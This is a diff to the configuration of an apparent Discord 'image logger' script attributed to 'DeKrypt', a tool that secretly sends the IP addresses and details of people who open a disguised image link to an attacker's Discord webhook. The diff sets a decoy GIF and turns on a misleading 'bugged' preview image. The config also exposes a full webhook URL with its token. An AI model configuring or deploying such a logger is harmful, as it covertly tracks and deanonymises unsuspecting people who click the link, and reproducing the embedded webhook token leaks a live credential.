@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335247493893586944/TAppETFOUy01pFxjtWZZWAI0iRcmziuZ6ProDX6Q3jEo7AlbpvppmgrnTaVM8B4YGP8c",
-    "image": "test.html", # You can also have a custom image by using a URL argument
+    "image": "https://www.icegif.com/wp-content/uploads/2023/08/icegif-294.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
